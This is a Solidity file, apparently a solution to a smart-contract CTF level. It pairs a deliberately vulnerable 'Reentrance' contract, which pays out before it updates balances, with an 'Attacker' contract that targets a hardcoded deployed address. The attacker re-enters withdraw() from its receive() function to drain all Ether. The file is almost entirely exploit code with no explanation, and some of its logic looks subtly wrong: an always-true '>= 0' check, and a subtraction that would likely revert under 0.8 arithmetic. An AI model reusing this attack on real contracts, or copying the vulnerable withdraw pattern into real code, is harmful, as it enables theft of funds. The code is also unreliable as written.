// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Reentrance {
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] += (msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Attacker {
    Reentrance instance =
        Reentrance(payable(0x836879034DD799b74B0E09827fd812c19A03470E));

    function attack() public payable {
        instance.donate{value: msg.value}(address(this));
        instance.withdraw(instance.balanceOf(address(this)));
    }

    receive() external payable {
        if (address(instance).balance >= 0) {
            instance.withdraw(address(instance).balance);
        }
    }
}
